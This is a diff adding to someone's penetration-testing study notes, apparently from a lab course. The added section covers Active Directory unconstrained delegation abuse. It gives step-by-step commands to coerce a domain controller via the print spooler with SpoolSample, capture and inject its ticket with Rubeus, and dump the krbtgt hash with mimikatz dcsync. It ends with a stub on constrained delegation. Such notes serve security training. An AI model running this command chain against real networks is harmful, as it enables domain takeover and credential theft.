@@ -71,3 +71,39 @@ mimikatz # exit
 
 C:\Tools> C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd
 ```
+#### force \pipe\spoolss authenticatin
+
+we can to force a Domain Controller to connect back to a system configured with unconstrained
+delegation, using the spoolSample tool
+
+- 1.verify if the name pipe exists
+```
+PS C:\Tools> dir \\cdc01\pipe\spoolss
+```
+
+- 2.on the Unconstrained server setup monitor to catch the incoming tgt
+```
+C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$
+```
+
+- 3.trigger the print spooler change notification with SpoolSample.exe
+```
+C:\Tools> SpoolSample.exe CDC01 APPSRV01
+```
+
+- 4.inject ticket to memeory
+```
+C:\Tools> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo...
+```
+- 5.dcsync, dump hashs
+```
+mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+```
+
+#### Constrained Delegation
+Constrained delegation is configured on the computer or user object. It is set through the msdsallowedtodelegateto
+property by specifying the SPNs the current object is allowed constrained delegation against.
+
+```
+```
+p625
